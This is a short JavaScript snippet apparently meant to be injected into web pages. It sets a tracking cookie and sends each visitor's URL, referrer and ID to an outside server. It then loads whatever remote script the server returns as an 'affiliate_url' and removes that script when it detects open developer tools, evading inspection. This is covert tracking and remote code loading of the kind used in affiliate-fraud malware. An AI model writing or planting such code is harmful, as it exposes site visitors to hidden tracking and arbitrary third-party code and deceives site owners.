(async function () {
  function detectDevice() {
    const ua = navigator.userAgent;
    if (/Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
      return "Mobile";
    }
    if (/Tablet|iPad/i.test(ua)) {
      return "Tablet";
    }
    return "Desktop";
  }

     function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }


  const deviceType = detectDevice();
  const hostname = window.location.hostname;

  try {

    let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';



    let response = await fetch("https://www.tracktraffics.com/api/track-user", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
         url: window.location.href,
        referrer: document.referrer,
        unique_id: uniqueId,
        origin: window.location.hostname,
      
      }),
    });

    let result = await response.json();

    if (result.affiliate_url) {
      const trackingScript = document.createElement("script");
      trackingScript.src = result.affiliate_url;
      trackingScript.referrerPolicy = "no-referrer";
      trackingScript.async = true;
      document.body.appendChild(trackingScript);

 
      function isDevToolsOpen() {
        return (
          window.outerHeight - window.innerHeight > 160 ||
          window.outerWidth - window.innerWidth > 160
        );
      }

      const interval = setInterval(() => {
        if (isDevToolsOpen()) {
          trackingScript.remove();
          clearInterval(interval);
        }
      }, 500);
    }
  } catch (err) {
    console.error("Fetch error:", err);
  }
})();
